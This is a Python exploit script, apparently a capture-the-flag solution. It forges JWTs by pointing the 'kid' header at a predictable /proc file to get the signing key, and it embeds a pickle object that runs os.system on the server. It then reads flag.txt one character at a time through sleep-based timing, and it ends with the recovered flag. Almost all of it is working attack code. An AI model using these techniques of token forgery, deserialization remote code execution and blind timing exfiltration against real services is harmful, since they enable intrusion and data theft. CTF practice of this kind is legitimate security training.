import base64
import hashlib
import hmac
import cPickle
import requests
import time
import string

def b64e(s):
    return base64.b64encode(s).replace("=","").replace("+","-").replace("/","_")


def b64d(s):
    t = ''
    try:
        t = base64.b64decode(s.replace("-","+").replace("_","/"))
        return t
    except:
         None
    try:
        s += "="
        t = base64.b64decode(s.replace("-","+").replace("_","/"))
        return t
    except:
         None
    try:
        s += "=="
        t = base64.b64decode(s.replace("-","+").replace("_","/"))
        return t
    except:
         None
    return t


class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))


exfil = ''
tts = 6
alphabet = string.lowercase+string.uppercase+string.digits+"_{}!-^:;,|()/\"%$."#string.printable#
while True:
    for j in alphabet:
        header = b64e("""{"typ": "JWT", "alg": "HS256", "kid": "/proc/sys/kernel/randomize_va_space"}""")
        #COMMAND = """ls | grep '^"""+exfil+j+'\' && sleep ' + str(tts)
        COMMAND = """cat flag.txt | grep '^"""+exfil+j+'\' && sleep ' + str(tts)
        payload = b64e(cPickle.dumps(PickleRce()))#"""gANjbWFpbgpVc2VyCnEAKYFxAX1xAihYCAAAAHVzZXJuYW1lcQNYAwAAAHA0d3EEWAQAAAByb2xlcQVYBAAAAHVzZXJxBnViLg"""
        signature = b64e(hmac.new( "2\n", msg=header+"."+payload, digestmod=hashlib.sha256).digest())
        jwt = header+"."+payload+"."+signature
        print "[+] new tampered jwt: "+jwt
        start = time.time()
        resp = requests.get("http://two.jh2i.com:50030/", cookies={"token":jwt})
        end = time.time()
        print "[+] time: " + str((end-start))
        print "="*100
        assert(resp.status_code == 200)
        if (end-start) > tts:
            exfil += j
            print "[*] exfilterd: " + exfil
            break

# flag: flag{all_that_just_for_a_pickle}
